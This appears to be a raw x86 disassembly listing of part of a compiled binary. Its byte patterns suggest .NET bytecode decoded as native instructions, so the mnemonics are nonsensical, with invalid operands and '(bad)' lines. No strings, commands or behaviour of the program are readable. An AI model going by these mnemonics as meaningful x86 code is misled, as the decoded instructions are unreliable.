  404730:	00 00                	add    %al,(%eax)
  404732:	06                   	push   %es
  404733:	13 0e                	adc    (%esi),%ecx
  404735:	12 0e                	adc    (%esi),%cl
  404737:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40473a:	00 06                	add    %al,(%esi)
  40473c:	7e 24                	jle    0x404762
  40473e:	00 00                	add    %al,(%eax)
  404740:	04 28                	add    $0x28,%al
  404742:	43                   	inc    %ebx
  404743:	00 00                	add    %al,(%eax)
  404745:	0a 0b                	or     (%ebx),%cl
  404747:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40474d:	00 00                	add    %al,(%eax)
  40474f:	00 07                	add    %al,(%edi)
  404751:	28 93 00 00 0a 7e    	sub    %dl,0x7e0a0000(%ebx)
  404757:	24 00                	and    $0x0,%al
  404759:	00 04 28             	add    %al,(%eax,%ebp,1)
  40475c:	43                   	inc    %ebx
  40475d:	00 00                	add    %al,(%eax)
  40475f:	0a 0b                	or     (%ebx),%cl
  404761:	de 21                	fisubs (%ecx)
  404763:	25 28 2c 00 00       	and    $0x2c28,%eax
  404768:	0a 13                	or     (%ebx),%dl
  40476a:	04 00                	add    $0x0,%al
  40476c:	07                   	pop    %es
  40476d:	72 b3                	jb     0x404722
  40476f:	0a 00                	or     (%eax),%al
  404771:	70 7e                	jo     0x4047f1
  404773:	24 00                	and    $0x0,%al
  404775:	00 04 28             	add    %al,(%eax,%ebp,1)
  404778:	43                   	inc    %ebx
  404779:	00 00                	add    %al,(%eax)
  40477b:	0a 0b                	or     (%ebx),%cl
  40477d:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  404783:	00 00                	add    %al,(%eax)
  404785:	00 07                	add    %al,(%edi)
  404787:	28 94 00 00 0a 7e 24 	sub    %dl,0x247e0a00(%eax,%eax,1)
  40478e:	00 00                	add    %al,(%eax)
  404790:	04 28                	add    $0x28,%al
  404792:	43                   	inc    %ebx
  404793:	00 00                	add    %al,(%eax)
  404795:	0a 0b                	or     (%ebx),%cl
  404797:	de 21                	fisubs (%ecx)
  404799:	25 28 2c 00 00       	and    $0x2c28,%eax
  40479e:	0a 13                	or     (%ebx),%dl
  4047a0:	05 00 07 72 b3       	add    $0xb3720700,%eax
  4047a5:	0a 00                	or     (%eax),%al
  4047a7:	70 7e                	jo     0x404827
  4047a9:	24 00                	and    $0x0,%al
  4047ab:	00 04 28             	add    %al,(%eax,%ebp,1)
  4047ae:	43                   	inc    %ebx
  4047af:	00 00                	add    %al,(%eax)
  4047b1:	0a 0b                	or     (%ebx),%cl
  4047b3:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4047b9:	00 00                	add    %al,(%eax)
  4047bb:	00 07                	add    %al,(%edi)
  4047bd:	7e 19                	jle    0x4047d8
  4047bf:	00 00                	add    %al,(%eax)
  4047c1:	04 6f                	add    $0x6f,%al
  4047c3:	95                   	xchg   %eax,%ebp
  4047c4:	00 00                	add    %al,(%eax)
  4047c6:	0a 13                	or     (%ebx),%dl
  4047c8:	0f 12 0f             	movlps (%edi),%xmm1
  4047cb:	28 96 00 00 0a 13    	sub    %dl,0x130a0000(%esi)
  4047d1:	10 12                	adc    %dl,(%edx)
  4047d3:	10 72 b9             	adc    %dh,-0x47(%edx)
  4047d6:	0a 00                	or     (%eax),%al
  4047d8:	70 28                	jo     0x404802
  4047da:	97                   	xchg   %eax,%edi
  4047db:	00 00                	add    %al,(%eax)
  4047dd:	0a 7e 24             	or     0x24(%esi),%bh
  4047e0:	00 00                	add    %al,(%eax)
  4047e2:	04 28                	add    $0x28,%al
  4047e4:	43                   	inc    %ebx
  4047e5:	00 00                	add    %al,(%eax)
  4047e7:	0a 0b                	or     (%ebx),%cl
  4047e9:	de 21                	fisubs (%ecx)
  4047eb:	25 28 2c 00 00       	and    $0x2c28,%eax
  4047f0:	0a 13                	or     (%ebx),%dl
  4047f2:	06                   	push   %es
  4047f3:	00 07                	add    %al,(%edi)
  4047f5:	72 cb                	jb     0x4047c2
  4047f7:	0a 00                	or     (%eax),%al
  4047f9:	70 7e                	jo     0x404879
  4047fb:	24 00                	and    $0x0,%al
  4047fd:	00 04 28             	add    %al,(%eax,%ebp,1)
  404800:	43                   	inc    %ebx
  404801:	00 00                	add    %al,(%eax)
  404803:	0a 0b                	or     (%ebx),%cl
  404805:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40480b:	00 00                	add    %al,(%eax)
  40480d:	07                   	pop    %es
  40480e:	72 69                	jb     0x404879
  404810:	00 00                	add    %al,(%eax)
  404812:	70 7e                	jo     0x404892
  404814:	24 00                	and    $0x0,%al
  404816:	00 04 28             	add    %al,(%eax,%ebp,1)
  404819:	43                   	inc    %ebx
  40481a:	00 00                	add    %al,(%eax)
  40481c:	0a 0b                	or     (%ebx),%cl
  40481e:	00 07                	add    %al,(%edi)
  404820:	7e 10                	jle    0x404832
  404822:	00 00                	add    %al,(%eax)
  404824:	04 6f                	add    $0x6f,%al
  404826:	98                   	cwtl
  404827:	00 00                	add    %al,(%eax)
  404829:	0a 6f 99             	or     -0x67(%edi),%ch
  40482c:	00 00                	add    %al,(%eax)
  40482e:	0a 72 dd             	or     -0x23(%edx),%dh
  404831:	0a 00                	or     (%eax),%al
  404833:	70 72                	jo     0x4048a7
  404835:	69 00 00 70 6f 9a    	imul   $0x9a6f7000,(%eax),%eax
  40483b:	00 00                	add    %al,(%eax)
  40483d:	0a 72 f1             	or     -0xf(%edx),%dh
  404840:	0a 00                	or     (%eax),%al
  404842:	70 72                	jo     0x4048b6
  404844:	01 0b                	add    %ecx,(%ebx)
  404846:	00 70 6f             	add    %dh,0x6f(%eax)
  404849:	9a 00 00 0a 72 09 0b 	lcall  $0xb09,$0x720a0000
  404850:	00 70 72             	add    %dh,0x72(%eax)
  404853:	69 00 00 70 6f 9a    	imul   $0x9a6f7000,(%eax),%eax
  404859:	00 00                	add    %al,(%eax)
  40485b:	0a 72 0d             	or     0xd(%edx),%dh
  40485e:	0b 00                	or     (%eax),%eax
  404860:	70 72                	jo     0x4048d4
  404862:	69 00 00 70 6f 9a    	imul   $0x9a6f7000,(%eax),%eax
  404868:	00 00                	add    %al,(%eax)
  40486a:	0a 72 11             	or     0x11(%edx),%dh
  40486d:	0b 00                	or     (%eax),%eax
  40486f:	70 72                	jo     0x4048e3
  404871:	17                   	pop    %ss
  404872:	0b 00                	or     (%eax),%eax
  404874:	70 6f                	jo     0x4048e5
  404876:	9a 00 00 0a 72 1b 0b 	lcall  $0xb1b,$0x720a0000
  40487d:	00 70 72             	add    %dh,0x72(%eax)
  404880:	01 0b                	add    %ecx,(%ebx)
  404882:	00 70 6f             	add    %dh,0x6f(%eax)
  404885:	9a 00 00 0a 28 4a 00 	lcall  $0x4a,$0x280a0000
  40488c:	00 0a                	add    %cl,(%edx)
  40488e:	0b de                	or     %esi,%ebx
  404890:	1c 25                	sbb    $0x25,%al
  404892:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  404895:	00 0a                	add    %cl,(%edx)
  404897:	13 07                	adc    (%edi),%eax
  404899:	00 07                	add    %al,(%edi)
  40489b:	72 b3                	jb     0x404850
  40489d:	0a 00                	or     (%eax),%al
  40489f:	70 28                	jo     0x4048c9
  4048a1:	4a                   	dec    %edx
  4048a2:	00 00                	add    %al,(%eax)
  4048a4:	0a 0b                	or     (%ebx),%cl
  4048a6:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4048ac:	00 00                	add    %al,(%eax)
  4048ae:	07                   	pop    %es
  4048af:	72 25                	jb     0x4048d6
  4048b1:	0b 00                	or     (%eax),%eax
  4048b3:	70 28                	jo     0x4048dd
  4048b5:	4a                   	dec    %edx
  4048b6:	00 00                	add    %al,(%eax)
  4048b8:	0a 0b                	or     (%ebx),%cl
  4048ba:	00 28                	add    %ch,(%eax)
  4048bc:	9b                   	fwait
  4048bd:	00 00                	add    %al,(%eax)
  4048bf:	0a 6f 9c             	or     -0x64(%edi),%ch
  4048c2:	00 00                	add    %al,(%eax)
  4048c4:	0a 72 17             	or     0x17(%edx),%dh
  4048c7:	0b 00                	or     (%eax),%eax
  4048c9:	70 15                	jo     0x4048e0
  4048cb:	16                   	push   %ss
  4048cc:	28 52 00             	sub    %dl,0x0(%edx)
  4048cf:	00 0a                	add    %cl,(%edx)
  4048d1:	13 08                	adc    (%eax),%ecx
  4048d3:	11 08                	adc    %ecx,(%eax)
  4048d5:	8e b7 17 fe 01 13    	mov    0x1301fe17(%edi),%?
  4048db:	14 11                	adc    $0x11,%al
  4048dd:	14 2c                	adc    $0x2c,%al
  4048df:	0c 07                	or     $0x7,%al
  4048e1:	72 4b                	jb     0x40492e
  4048e3:	05 00 70 28 4a       	add    $0x4a287000,%eax
  4048e8:	00 00                	add    %al,(%eax)
  4048ea:	0a 0b                	or     (%ebx),%cl
  4048ec:	00 07                	add    %al,(%edi)
  4048ee:	11 08                	adc    %ecx,(%eax)
  4048f0:	11 08                	adc    %ecx,(%eax)
  4048f2:	8e b7 17 da 9a 28    	mov    0x289ada17(%edi),%?
  4048f8:	4a                   	dec    %edx
  4048f9:	00 00                	add    %al,(%eax)
  4048fb:	0a 0b                	or     (%ebx),%cl
  4048fd:	de 1c 25 28 2c 00 00 	ficomps 0x2c28(,%eiz,1)
  404904:	0a 13                	or     (%ebx),%dl
  404906:	09 00                	or     %eax,(%eax)
  404908:	07                   	pop    %es
  404909:	72 4b                	jb     0x404956
  40490b:	05 00 70 28 4a       	add    $0x4a287000,%eax
  404910:	00 00                	add    %al,(%eax)
  404912:	0a 0b                	or     (%ebx),%cl
  404914:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40491a:	00 00                	add    %al,(%eax)
  40491c:	00 1f                	add    %bl,(%edi)
  40491e:	26 28 9d 00 00 0a 72 	sub    %bl,%es:0x720a0000(%ebp)
  404925:	2b 0b                	sub    (%ebx),%ecx
  404927:	00 70 6f             	add    %dh,0x6f(%eax)
  40492a:	9e                   	sahf
  40492b:	00 00                	add    %al,(%eax)
  40492d:	0a 13                	or     (%ebx),%dl
  40492f:	14 11                	adc    $0x11,%al
  404931:	14 2c                	adc    $0x2c,%al
  404933:	13 07                	adc    (%edi),%eax
  404935:	72 33                	jb     0x40496a
  404937:	0b 00                	or     (%eax),%eax
  404939:	70 7e                	jo     0x4049b9
  40493b:	24 00                	and    $0x0,%al
  40493d:	00 04 28             	add    %al,(%eax,%ebp,1)
  404940:	43                   	inc    %ebx
  404941:	00 00                	add    %al,(%eax)
  404943:	0a 0b                	or     (%ebx),%cl
  404945:	2b 12                	sub    (%edx),%edx
  404947:	00 07                	add    %al,(%edi)
  404949:	72 3d                	jb     0x404988
  40494b:	0b 00                	or     (%eax),%eax
  40494d:	70 7e                	jo     0x4049cd
  40494f:	24 00                	and    $0x0,%al
  404951:	00 04 28             	add    %al,(%eax,%ebp,1)
  404954:	43                   	inc    %ebx
  404955:	00 00                	add    %al,(%eax)
  404957:	0a 0b                	or     (%ebx),%cl
  404959:	00 de                	add    %bl,%dh
  40495b:	1c 25                	sbb    $0x25,%al
  40495d:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  404960:	00 0a                	add    %cl,(%edx)
  404962:	13 0a                	adc    (%edx),%ecx
  404964:	00 07                	add    %al,(%edi)
  404966:	7e 24                	jle    0x40498c
  404968:	00 00                	add    %al,(%eax)
  40496a:	04 28                	add    $0x28,%al
  40496c:	4a                   	dec    %edx
  40496d:	00 00                	add    %al,(%eax)
  40496f:	0a 0b                	or     (%ebx),%cl
  404971:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  404977:	00 00                	add    %al,(%eax)
  404979:	28 19                	sub    %bl,(%ecx)
  40497b:	00 00                	add    %al,(%eax)
  40497d:	06                   	push   %es
  40497e:	13 14 11             	adc    (%ecx,%edx,1),%edx
  404981:	14 2c                	adc    $0x2c,%al
  404983:	13 07                	adc    (%edi),%eax
  404985:	72 47                	jb     0x4049ce
  404987:	0b 00                	or     (%eax),%eax
  404989:	70 7e                	jo     0x404a09
  40498b:	24 00                	and    $0x0,%al
  40498d:	00 04 28             	add    %al,(%eax,%ebp,1)
  404990:	43                   	inc    %ebx
  404991:	00 00                	add    %al,(%eax)
  404993:	0a 0b                	or     (%ebx),%cl
  404995:	2b 12                	sub    (%edx),%edx
  404997:	00 07                	add    %al,(%edi)
  404999:	72 4f                	jb     0x4049ea
  40499b:	0b 00                	or     (%eax),%eax
  40499d:	70 7e                	jo     0x404a1d
  40499f:	24 00                	and    $0x0,%al
  4049a1:	00 04 28             	add    %al,(%eax,%ebp,1)
  4049a4:	43                   	inc    %ebx
  4049a5:	00 00                	add    %al,(%eax)
  4049a7:	0a 0b                	or     (%ebx),%cl
  4049a9:	00 1d 8d 23 00 00    	add    %bl,0x238d
  4049af:	01 13                	add    %edx,(%ebx)
  4049b1:	11 11                	adc    %edx,(%ecx)
  4049b3:	11 16                	adc    %edx,(%esi)
  4049b5:	07                   	pop    %es
  4049b6:	a2 00 11 11 17       	mov    %al,0x17111100
  4049bb:	7e 23                	jle    0x4049e0
  4049bd:	00 00                	add    %al,(%eax)
  4049bf:	04 a2                	add    $0xa2,%al
  4049c1:	00 11                	add    %dl,(%ecx)
  4049c3:	11 18                	adc    %ebx,(%eax)
  4049c5:	7e 24                	jle    0x4049eb
  4049c7:	00 00                	add    %al,(%eax)
  4049c9:	04 a2                	add    $0xa2,%al
  4049cb:	00 11                	add    %dl,(%ecx)
  4049cd:	11 19                	adc    %ebx,(%ecx)
  4049cf:	72 65                	jb     0x404a36
  4049d1:	0a 00                	or     (%eax),%al
  4049d3:	70 a2                	jo     0x404977
  4049d5:	00 11                	add    %dl,(%ecx)
  4049d7:	11 1a                	adc    %ebx,(%edx)
  4049d9:	7e 24                	jle    0x4049ff
  4049db:	00 00                	add    %al,(%eax)
  4049dd:	04 a2                	add    $0xa2,%al
  4049df:	00 11                	add    %dl,(%ecx)
  4049e1:	11 1b                	adc    %ebx,(%ebx)
  4049e3:	28 17                	sub    %dl,(%edi)
  4049e5:	00 00                	add    %al,(%eax)
  4049e7:	06                   	push   %es
  4049e8:	a2 00 11 11 1c       	mov    %al,0x1c111100
  4049ed:	7e 24                	jle    0x404a13
  4049ef:	00 00                	add    %al,(%eax)
  4049f1:	04 a2                	add    $0xa2,%al
  4049f3:	00 11                	add    %dl,(%ecx)
  4049f5:	11 28                	adc    %ebp,(%eax)
  4049f7:	44                   	inc    %esp
  4049f8:	00 00                	add    %al,(%eax)
  4049fa:	0a 0b                	or     (%ebx),%cl
  4049fc:	72 69                	jb     0x404a67
  4049fe:	00 00                	add    %al,(%eax)
  404a00:	70 0c                	jo     0x404a0e
  404a02:	00 7e 10             	add    %bh,0x10(%esi)
  404a05:	00 00                	add    %al,(%eax)
  404a07:	04 6f                	add    $0x6f,%al
  404a09:	48                   	dec    %eax
  404a0a:	00 00                	add    %al,(%eax)
  404a0c:	0a 6f 49             	or     0x49(%edi),%ch
  404a0f:	00 00                	add    %al,(%eax)
  404a11:	0a 72 9d             	or     -0x63(%edx),%dh
  404a14:	01 00                	add    %eax,(%eax)
  404a16:	70 7e                	jo     0x404a96
  404a18:	1f                   	pop    %ds
  404a19:	00 00                	add    %al,(%eax)
  404a1b:	04 28                	add    $0x28,%al
  404a1d:	4a                   	dec    %edx
  404a1e:	00 00                	add    %al,(%eax)
  404a20:	0a 16                	or     (%esi),%dl
  404a22:	6f                   	outsl  %ds:(%esi),(%dx)
  404a23:	9f                   	lahf
  404a24:	00 00                	add    %al,(%eax)
  404a26:	0a 6f a0             	or     -0x60(%edi),%ch
  404a29:	00 00                	add    %al,(%eax)
  404a2b:	0a 13                	or     (%ebx),%dl
  404a2d:	13 16                	adc    (%esi),%edx
  404a2f:	13 12                	adc    (%edx),%edx
  404a31:	2b 2e                	sub    (%esi),%ebp
  404a33:	11 13                	adc    %edx,(%ebx)
  404a35:	11 12                	adc    %edx,(%edx)
  404a37:	9a 13 0b 11 0b 6f 2b 	lcall  $0x2b6f,$0xb110b13
  404a3e:	00 00                	add    %al,(%eax)
  404a40:	0a 1f                	or     (%edi),%bl
  404a42:	20 fe                	and    %bh,%dh
  404a44:	01 13                	add    %edx,(%ebx)
  404a46:	14 11                	adc    $0x11,%al
  404a48:	14 2c                	adc    $0x2c,%al
  404a4a:	0e                   	push   %cs
  404a4b:	08 11                	or     %dl,(%ecx)
  404a4d:	0b 72 d5             	or     -0x2b(%edx),%esi
  404a50:	01 00                	add    %eax,(%eax)
  404a52:	70 28                	jo     0x404a7c
  404a54:	43                   	inc    %ebx
  404a55:	00 00                	add    %al,(%eax)
  404a57:	0a 0c 00             	or     (%eax,%eax,1),%cl
  404a5a:	11 12                	adc    %edx,(%edx)
  404a5c:	17                   	pop    %ss
  404a5d:	d6                   	salc
  404a5e:	13 12                	adc    (%edx),%edx
  404a60:	00 11                	add    %dl,(%ecx)
  404a62:	12 11                	adc    (%ecx),%dl
  404a64:	13 8e b7 fe 04 13    	adc    0x1304feb7(%esi),%ecx
  404a6a:	14 11                	adc    $0x11,%al
  404a6c:	14 2d                	adc    $0x2d,%al
  404a6e:	c4                   	(bad)
  404a6f:	de 10                	ficoms (%eax)
  404a71:	25 28 2c 00 00       	and    $0x2c28,%eax
  404a76:	0a 13                	or     (%ebx),%dl
  404a78:	0c 00                	or     $0x0,%al
  404a7a:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  404a80:	00 00                	add    %al,(%eax)
  404a82:	07                   	pop    %es
  404a83:	08 28                	or     %ch,(%eax)
  404a85:	4a                   	dec    %edx
  404a86:	00 00                	add    %al,(%eax)
  404a88:	0a 0a                	or     (%edx),%cl
  404a8a:	2b 00                	sub    (%eax),%eax
  404a8c:	06                   	push   %es
  404a8d:	2a 00                	sub    (%eax),%al
  404a8f:	00 01                	add    %al,(%ecx)
  404a91:	64 00 00             	add    %al,%fs:(%eax)
  404a94:	00 00                	add    %al,(%eax)
  404a96:	12 00                	adc    (%eax),%al
  404a98:	9f                   	lahf
  404a99:	b1 00                	mov    $0x0,%cl
  404a9b:	29 20                	sub    %esp,(%eax)
  404a9d:	00 00                	add    %al,(%eax)
  404a9f:	01 00                	add    %eax,(%eax)
  404aa1:	00 dc                	add    %bl,%ah
  404aa3:	00 13                	add    %dl,(%ebx)
  404aa5:	ef                   	out    %eax,(%dx)
  404aa6:	00 21                	add    %ah,(%ecx)
  404aa8:	20 00                	and    %al,(%eax)
  404aaa:	00 01                	add    %al,(%ecx)
  404aac:	00 00                	add    %al,(%eax)
  404aae:	12 01                	adc    (%ecx),%al
  404ab0:	13 25 01 21 20 00    	adc    0x202101,%esp
  404ab6:	00 01                	add    %al,(%ecx)
  404ab8:	00 00                	add    %al,(%eax)
  404aba:	48                   	dec    %eax
  404abb:	01 2f                	add    %ebp,(%edi)
  404abd:	77 01                	ja     0x404ac0
  404abf:	21 20                	and    %esp,(%eax)
  404ac1:	00 00                	add    %al,(%eax)
  404ac3:	01 00                	add    %eax,(%eax)
  404ac5:	00 ab 01 72 1d 02    	add    %ch,0x21d7201(%ebx)
  404acb:	1c 20                	sbb    $0x20,%al
  404acd:	00 00                	add    %al,(%eax)
  404acf:	01 00                	add    %eax,(%eax)
  404ad1:	00 47 02             	add    %al,0x2(%edi)
  404ad4:	44                   	inc    %esp
  404ad5:	8b 02                	mov    (%edx),%eax
  404ad7:	1c 20                	sbb    $0x20,%al
  404ad9:	00 00                	add    %al,(%eax)
  404adb:	01 00                	add    %eax,(%eax)
  404add:	00 a9 02 3f e8 02    	add    %ch,0x2e83f02(%ecx)
  404ae3:	1c 20                	sbb    $0x20,%al
  404ae5:	00 00                	add    %al,(%eax)
  404ae7:	01 00                	add    %eax,(%eax)
  404ae9:	00 8f 03 6e fd 03    	add    %cl,0x3fd6e03(%edi)
  404aef:	10 20                	adc    %ah,(%eax)
  404af1:	00 00                	add    %al,(%eax)
  404af3:	01 1b                	add    %ebx,(%ebx)
  404af5:	30 05 00 12 04 00    	xor    %al,0x41200
  404afb:	00 18                	add    %bl,(%eax)
  404afd:	00 00                	add    %al,(%eax)
  404aff:	11 00                	adc    %eax,(%eax)
  404b01:	20 e8                	and    %ch,%al
  404b03:	03 00                	add    (%eax),%eax
  404b05:	00 28                	add    %ch,(%eax)
  404b07:	36 00 00             	add    %al,%ss:(%eax)
  404b0a:	0a 00                	or     (%eax),%al
  404b0c:	7e 14                	jle    0x404b22
  404b0e:	00 00                	add    %al,(%eax)
  404b10:	04 2c                	add    $0x2c,%al
  404b12:	34 7e                	xor    $0x7e,%al
  404b14:	19 00                	sbb    %eax,(%eax)
  404b16:	00 04 7e             	add    %al,(%esi,%edi,2)
  404b19:	0e                   	push   %cs
  404b1a:	00 00                	add    %al,(%eax)
  404b1c:	04 28                	add    $0x28,%al
  404b1e:	50                   	push   %eax
  404b1f:	00 00                	add    %al,(%eax)
  404b21:	0a 6f 31             	or     0x31(%edi),%ch
  404b24:	00 00                	add    %al,(%eax)
  404b26:	0a 72 c9             	or     -0x37(%edx),%dh
  404b29:	01 00                	add    %eax,(%eax)
  404b2b:	70 7e                	jo     0x404bab
  404b2d:	0f 00 00             	sldt   (%eax)
  404b30:	04 6f                	add    $0x6f,%al
  404b32:	31 00                	xor    %eax,(%eax)
  404b34:	00 0a                	add    %cl,(%edx)
  404b36:	28 43 00             	sub    %al,0x0(%ebx)
  404b39:	00 0a                	add    %cl,(%edx)
  404b3b:	73 25                	jae    0x404b62
  404b3d:	00 00                	add    %al,(%eax)
  404b3f:	0a 28                	or     (%eax),%ch
  404b41:	1f                   	pop    %ds
  404b42:	00 00                	add    %al,(%eax)
  404b44:	06                   	push   %es
  404b45:	2c 03                	sub    $0x3,%al
  404b47:	16                   	push   %ss
  404b48:	2b 01                	sub    (%ecx),%eax
  404b4a:	17                   	pop    %ss
  404b4b:	13 11                	adc    (%ecx),%edx
  404b4d:	11 11                	adc    %edx,(%ecx)
  404b4f:	39 b7 00 00 00 00    	cmp    %esi,0x0(%edi)
  404b55:	28 a1 00 00 0a 18    	sub    %ah,0x180a0000(%ecx)
  404b5b:	28 a2 00 00 0a 00    	sub    %ah,0xa0000(%edx)
  404b61:	7e 0e                	jle    0x404b71
  404b63:	00 00                	add    %al,(%eax)
  404b65:	04 28                	add    $0x28,%al
  404b67:	50                   	push   %eax
  404b68:	00 00                	add    %al,(%eax)
  404b6a:	0a 72 c9             	or     -0x37(%edx),%dh
  404b6d:	01 00                	add    %eax,(%eax)
  404b6f:	70 7e                	jo     0x404bef
  404b71:	0f 00 00             	sldt   (%eax)
  404b74:	04 28                	add    $0x28,%al
  404b76:	43                   	inc    %ebx
  404b77:	00 00                	add    %al,(%eax)
  404b79:	0a 28                	or     (%eax),%ch
  404b7b:	68 00 00 0a 13       	push   $0x130a0000
  404b80:	11 11                	adc    %edx,(%ecx)
  404b82:	11 2c 1f             	adc    %ebp,(%edi,%ebx,1)
  404b85:	7e 0e                	jle    0x404b95
  404b87:	00 00                	add    %al,(%eax)
  404b89:	04 28                	add    $0x28,%al
  404b8b:	50                   	push   %eax
  404b8c:	00 00                	add    %al,(%eax)
  404b8e:	0a 72 c9             	or     -0x37(%edx),%dh
  404b91:	01 00                	add    %eax,(%eax)
  404b93:	70 7e                	jo     0x404c13
  404b95:	0f 00 00             	sldt   (%eax)
  404b98:	04 28                	add    $0x28,%al
  404b9a:	43                   	inc    %ebx
  404b9b:	00 00                	add    %al,(%eax)
  404b9d:	0a 28                	or     (%eax),%ch
  404b9f:	a3 00 00 0a 00       	mov    %eax,0xa0000
  404ba4:	7e 19                	jle    0x404bbf
  404ba6:	00 00                	add    %al,(%eax)
  404ba8:	04 6f                	add    $0x6f,%al
  404baa:	91                   	xchg   %eax,%ecx
  404bab:	00 00                	add    %al,(%eax)
  404bad:	0a 7e 0e             	or     0xe(%esi),%bh
  404bb0:	00 00                	add    %al,(%eax)
  404bb2:	04 28                	add    $0x28,%al
  404bb4:	50                   	push   %eax
  404bb5:	00 00                	add    %al,(%eax)
  404bb7:	0a 72 c9             	or     -0x37(%edx),%dh
  404bba:	01 00                	add    %eax,(%eax)
  404bbc:	70 7e                	jo     0x404c3c
  404bbe:	0f 00 00             	sldt   (%eax)
  404bc1:	04 28                	add    $0x28,%al
  404bc3:	43                   	inc    %ebx
  404bc4:	00 00                	add    %al,(%eax)
  404bc6:	0a 17                	or     (%edi),%dl
  404bc8:	28 a4 00 00 0a 00 7e 	sub    %ah,0x7e000a00(%eax,%eax,1)
  404bcf:	0e                   	push   %cs
  404bd0:	00 00                	add    %al,(%eax)
  404bd2:	04 28                	add    $0x28,%al
  404bd4:	50                   	push   %eax
  404bd5:	00 00                	add    %al,(%eax)
  404bd7:	0a 72 c9             	or     -0x37(%edx),%dh
  404bda:	01 00                	add    %eax,(%eax)
  404bdc:	70 7e                	jo     0x404c5c
  404bde:	0f 00 00             	sldt   (%eax)
  404be1:	04 28                	add    $0x28,%al
  404be3:	43                   	inc    %ebx
  404be4:	00 00                	add    %al,(%eax)
  404be6:	0a 28                	or     (%eax),%ch
  404be8:	55                   	push   %ebp
  404be9:	00 00                	add    %al,(%eax)
  404beb:	0a 26                	or     (%esi),%ah
  404bed:	28 90 00 00 0a 00    	sub    %dl,0xa0000(%eax)
  404bf3:	de 15 25 28 2c 00    	ficoms 0x2c2825
  404bf9:	00 0a                	add    %cl,(%edx)
  404bfb:	0a 00                	or     (%eax),%al
  404bfd:	28 90 00 00 0a 00    	sub    %dl,0xa0000(%eax)
  404c03:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  404c09:	00 00                	add    %al,(%eax)
  404c0b:	00 00                	add    %al,(%eax)
  404c0d:	1b 8d 23 00 00 01    	sbb    0x1000023(%ebp),%ecx
  404c13:	13 0e                	adc    (%esi),%ecx
  404c15:	11 0e                	adc    %ecx,(%esi)
  404c17:	16                   	push   %ss
  404c18:	72 55                	jb     0x404c6f
  404c1a:	0b 00                	or     (%eax),%eax
  404c1c:	70 a2                	jo     0x404bc0
  404c1e:	00 11                	add    %dl,(%ecx)
  404c20:	0e                   	push   %cs
  404c21:	17                   	pop    %ss
  404c22:	7e 19                	jle    0x404c3d
  404c24:	00 00                	add    %al,(%eax)
  404c26:	04 6f                	add    $0x6f,%al
  404c28:	91                   	xchg   %eax,%ecx
  404c29:	00 00                	add    %al,(%eax)
  404c2b:	0a a2 00 11 0e 18    	or     0x180e1100(%edx),%ah
  404c31:	72 9d                	jb     0x404bd0
  404c33:	0b 00                	or     (%eax),%eax
  404c35:	70 a2                	jo     0x404bd9
  404c37:	00 11                	add    %dl,(%ecx)
  404c39:	0e                   	push   %cs
  404c3a:	19 7e 19             	sbb    %edi,0x19(%esi)
  404c3d:	00 00                	add    %al,(%eax)
  404c3f:	04 6f                	add    $0x6f,%al
  404c41:	30 00                	xor    %al,(%eax)
  404c43:	00 0a                	add    %cl,(%edx)
  404c45:	a2 00 11 0e 1a       	mov    %al,0x1a0e1100
  404c4a:	72 a5                	jb     0x404bf1
  404c4c:	0b 00                	or     (%eax),%eax
  404c4e:	70 a2                	jo     0x404bf2
  404c50:	00 11                	add    %dl,(%ecx)
  404c52:	0e                   	push   %cs
  404c53:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  404c57:	0a 16                	or     (%esi),%dl
  404c59:	16                   	push   %ss
  404c5a:	15 28 56 00 00       	adc    $0x5628,%eax
  404c5f:	0a 26                	or     (%esi),%ah
  404c61:	de 0f                	fimuls (%edi)
  404c63:	25 28 2c 00 00       	and    $0x2c28,%eax
  404c68:	0a 0b                	or     (%ebx),%cl
  404c6a:	00 28                	add    %ch,(%eax)
  404c6c:	2d 00 00 0a de       	sub    $0xde0a0000,%eax
  404c71:	00 00                	add    %al,(%eax)
  404c73:	7e 16                	jle    0x404c8b
  404c75:	00 00                	add    %al,(%eax)
  404c77:	04 13                	add    $0x13,%al
  404c79:	11 11                	adc    %edx,(%ecx)
  404c7b:	11 39                	adc    %edi,(%ecx)
  404c7d:	a2 00 00 00 00       	mov    %al,0x0
  404c82:	7e 10                	jle    0x404c94
  404c84:	00 00                	add    %al,(%eax)
  404c86:	04 6f                	add    $0x6f,%al
  404c88:	48                   	dec    %eax
  404c89:	00 00                	add    %al,(%eax)
  404c8b:	0a 6f 49             	or     0x49(%edi),%ch
  404c8e:	00 00                	add    %al,(%eax)
  404c90:	0a 7e 20             	or     0x20(%esi),%bh
  404c93:	00 00                	add    %al,(%eax)
  404c95:	04 17                	add    $0x17,%al
  404c97:	6f                   	outsl  %ds:(%esi),(%dx)
  404c98:	4b                   	dec    %ebx
  404c99:	00 00                	add    %al,(%eax)
  404c9b:	0a 7e 1f             	or     0x1f(%esi),%bh
  404c9e:	00 00                	add    %al,(%eax)
  404ca0:	04 72                	add    $0x72,%al
  404ca2:	b7 0b                	mov    $0xb,%bh
  404ca4:	00 70 7e             	add    %dh,0x7e(%eax)
  404ca7:	19 00                	sbb    %eax,(%eax)
  404ca9:	00 04 6f             	add    %al,(%edi,%ebp,2)
  404cac:	91                   	xchg   %eax,%ecx
  404cad:	00 00                	add    %al,(%eax)
  404caf:	0a 72 bb             	or     -0x45(%edx),%dh
  404cb2:	0b 00                	or     (%eax),%eax
  404cb4:	70 28                	jo     0x404cde
  404cb6:	43                   	inc    %ebx
  404cb7:	00 00                	add    %al,(%eax)
  404cb9:	0a 6f 54             	or     0x54(%edi),%ch
  404cbc:	00 00                	add    %al,(%eax)
  404cbe:	0a 00                	or     (%eax),%al
  404cc0:	de 0f                	fimuls (%edi)
  404cc2:	25 28 2c 00 00       	and    $0x2c28,%eax
  404cc7:	0a 0c 00             	or     (%eax,%eax,1),%cl
  404cca:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
